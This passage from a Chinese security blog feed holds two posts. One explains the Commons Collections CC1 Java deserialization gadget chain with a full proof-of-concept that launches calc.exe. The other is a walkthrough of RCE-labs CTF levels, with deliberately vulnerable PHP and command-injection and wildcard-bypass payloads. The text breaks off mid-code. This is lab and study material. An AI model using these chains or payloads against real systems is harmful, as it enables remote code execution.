alt="image-20250616155705540"></p><p>TransformedMap是继承AbstractInputCheckedMapDecorator，AbstractInputCheckedMapDecorator又继承AbstractMapDecorator：<br><img src="/archives/186141d8/image-20250616155942264.png" alt="image-20250616155942264"></p><p>根据<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">ysoserial</a>的调用链可以看到LazyMap与TransformedMap调用链主要在于触发ChainedTransformer的Transform方法不同</p><p><img src="/archives/186141d8/image-20250616205634956.png" alt="image-20250616205634956"></p><p>LazyMap链是通过**LazyMap.get()<strong>调用</strong>ChainedTransformer.Transform()**的：<br><img src="/archives/186141d8/image-20250618091930852.png" alt="image-20250618091930852"></p><p>该方法首先会检查Map中是否不存在传入的key，若key不存在，则会调用<code>Object value = factory.transform(key);</code>创建新值，然后将新生成的<code>value</code>与<code>key</code>关联并存入Map。</p><p>这里我们看下factory是否可控：<br><img src="/archives/186141d8/image-20250618092509569.png" alt="image-20250618092509569"></p><p>可以看到factory是可控的，我们可以通过decorate方法传入，那么：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; Lazymap= LazyMap.decorate(hashMap, chained);</span><br></pre></td></tr></table></figure><p>现在将chained传入了，然后我们查找调用了**LazyMap.get()<strong>的方法，找到</strong>AnnotationInvocationHandler.invoke()**方法：</p><p><img src="/archives/186141d8/image-20250618093733165.png" alt="image-20250618093733165"></p><p>该方法执行了<code>Object result = memberValues.get(member);</code>，memberValues是可控的，就是我们要传入的LazyMap对象。</p><p>但要如何调用invoke方法呢？</p><p>其实这里涉及到动态代理的知识，需要用到<code>Java.lang.reflect.Proxy</code>类和<code>InvocationHandler</code>接口</p><p><code>InvocationHandler</code>接口：</p><p><img src="/archives/186141d8/image-20250618100049820.png" alt="image-20250618100049820"></p><p>该接口负责提供调用代理的操作，而<strong>AnnotationInvocationHandler</strong>正是继承了该接口，重写了invoke方法，其中<code>proxy</code>为动态生成的代理对象(不是被代理的实际对象)，<code>method</code>表示调用的方法名(通过反射获取的Method对象)，<code>args</code>为调用方法的参数数组</p><p>而在<code>Java.lang.reflect.Proxy</code>类中提供了一个静态方法用于得到代理对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler handler)</span></span><br></pre></td></tr></table></figure><blockquote><p>loader指类加载器(通常使用目标接口的类加载器，用于加载动态生成的代理类)</p><p>interfaces指代理类要实现的接口列表</p><p>handler指方法调用的处理器</p></blockquote><p>而当调用<strong>代理对象</strong>的方法时就会自动触发invoke方法</p><p>所以我们可以将<strong>AnnotationInvocationHandler</strong>对象传入<strong>newProxyInstance</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure><p>再将生成的proxy代理类作为Map参数传入到<strong>AnnotationInvocationHandler</strong>实例中:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o=constructor.newInstance(Retention.class, proxy);</span><br></pre></td></tr></table></figure><p>这样在反序列化时会调用<strong>raedObject</strong>方法，readObject方法中存在**memberValues.entrySet()<strong>，由于memberValues是我们传入的代理类，即调用了代理对象，就会自动触发</strong>AnnotationInvocationHandler.invoke()<strong>方法，而handler中传入的memberValues是Lazymap，就会调用</strong>LazyMap.get()<strong>方法从而触发</strong>ChainedTransformer.Transform()**方法。可能有点绕，但静下来想一想还是能想清楚的。</p><p>完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(hashMap, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//可不需要，因为不用去触发memberValues.getValue()方法</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler= (InvocationHandler)constructor.newInstance(Retention.class, Lazymap);</span><br><span class="line">        Map proxy= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,proxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算机</p><p><img src="/archives/186141d8/image-20250619101523652.png" alt="image-20250619101523652"></p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">AnnotationInvocationHandler -&gt; readObject()</span><br><span class="line">Map(proxy) -&gt; entrySet()</span><br><span class="line">AnnotationInvocationHandler -&gt; invoke()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在Java 8u71以后，官方修改了sun.reflect.annotation.AnnotationInvocationHandler的readObject方法。</p><p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://1dayluo.github.io/posts/history/cc1-lian-xue-xi-bi-ji">https://1dayluo.github.io/posts/history/cc1-lian-xue-xi-bi-ji</a></p><p><a href="https://www.cnblogs.com/wobuchifanqie/p/9991342.html">https://www.cnblogs.com/wobuchifanqie/p/9991342.html</a></p><p><a href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections1-60b5c62c3bae4db3bba34928e02b653c">https://nivi4.notion.site/Java-CommonCollections1-60b5c62c3bae4db3bba34928e02b653c</a></p><p><a href="https://www.cnblogs.com/1vxyz/p/17284838.html">https://www.cnblogs.com/1vxyz/p/17284838.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE-labs练习</title>
      <link href="/archives/e35c5044/"/>
      <url>/archives/e35c5044/</url>
      
        <content type="html"><![CDATA[<p>靶场地址及官方wp：<a href="https://github.com/ProbiusOfficial/RCE-labs?tab=readme-ov-file">https://github.com/ProbiusOfficial/RCE-labs?tab=readme-ov-file</a></p><p>本文用的是CTF++平台进行复现的</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>考察代码执行的常见函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;get_flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启 session</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_ctf</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$function</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$content</span> . <span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your Code: <span class="subst">$code</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$func_list</span> = [<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;usort&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;array_reduce&#x27;</span>,<span class="string">&#x27;preg_replace&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>] = <span class="variable">$func_list</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$func_list</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$random_func</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$url_fucn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/_/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;获得新的函数: <span class="subst">$random_func</span> ，去 https://www.php.net/manual/zh/function.&quot;</span>.<span class="variable">$url_fucn</span>.<span class="string">&quot;.php 查看函数详情。&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"><span class="variable">$act</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$random_func</span> = <span class="title function_ invoke__">get_fun</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&quot;r&quot;</span>)&#123; <span class="comment">/* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */</span></span><br><span class="line">        <span class="title function_ invoke__">session_unset</span>();</span><br><span class="line">        <span class="title function_ invoke__">session_destroy</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$act</span> == <span class="string">&quot;submit&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$user_content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]; </span><br><span class="line">        <span class="title function_ invoke__">hello_ctf</span>(<span class="variable">$random_func</span>, <span class="variable">$user_content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="title function_ invoke__">start</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="array-reduce"><a href="#array-reduce" class="headerlink" title="array_reduce"></a>array_reduce</h3><p>用回调函数将数组化为单一的值，第一个参数为数组元素，第二个为回调函数，第三个为回调函数初始值，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>([<span class="number">1</span>], <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524210815620.png" alt="image-20250524210815620"></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>回调函数,第一个参数为函数名，其余参数为函数的参数，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;cat /flag&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524211144899.png" alt="image-20250524211144899"></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>通过执行代码字符串创建动态函数,payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524211643844.png" alt="image-20250524211643844"></p><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><p>将回调函数应用到数组每个元素，返回处理后的新数组。payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="variable">$_POST</span>[<span class="number">2</span>],<span class="variable">$_POST</span>[<span class="number">1</span>]&amp;<span class="number">1</span>[]=cat /flag&amp;<span class="number">2</span>=system</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524212730936.png" alt="image-20250524212730936"></p><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h3><p>与call_user_func一样，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="variable">$_POST</span>[<span class="number">2</span>],<span class="variable">$_POST</span>[<span class="number">1</span>]&amp;<span class="number">1</span>[]=cat /flag&amp;<span class="number">2</span>=system</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524212855867.png" alt="image-20250524212855867"></p><h3 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h3><p>用自定义比较函数对数组排序（依赖用户定义的规则）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>)</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524213755390.png" alt="image-20250524213755390"></p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><p>用回调函数过滤数组中的元素：array_filter(数组,函数)，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=system(&#x27;cat /flag&#x27;),assert</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524214024969.png" alt="image-20250524214024969"></p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>执行一个正则表达式的搜索和替换，<code>/e</code> 修饰符可执行代码（PHP 7.4 之前）。payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524214718162.png" alt="image-20250524214718162"></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>考查简单的命令执行，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=cat /flag</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>考察shell运算符，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>;cat /flag</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>简单的绕过，通配符绕过，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat /f*</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?没禁，通配符直接绕，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a? /??a?</span><br></pre></td></tr></table></figure><p>可能path有问题，用绝对路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 